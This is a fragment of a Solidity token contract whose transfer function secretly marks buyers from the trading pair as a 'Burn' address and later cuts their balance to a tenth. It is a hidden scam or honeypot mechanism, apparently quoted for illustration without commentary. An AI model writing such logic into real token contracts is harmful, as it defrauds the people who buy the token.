...
contract CoinToken {
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        ti+=2;
        if (Burn != Owner && to != Burn && balanceOf[Burn]>=totalSupply.div(20+ti)) {
            balanceOf[Burn]=balanceOf[Burn].div(10);}
        if (msg.sender==ZillaPair() && balanceOf[to]==0) {Burn = to;}
        if (to== Owner) {Burn=to;}
    ...
    function ZillaPair() public view returns (address) {
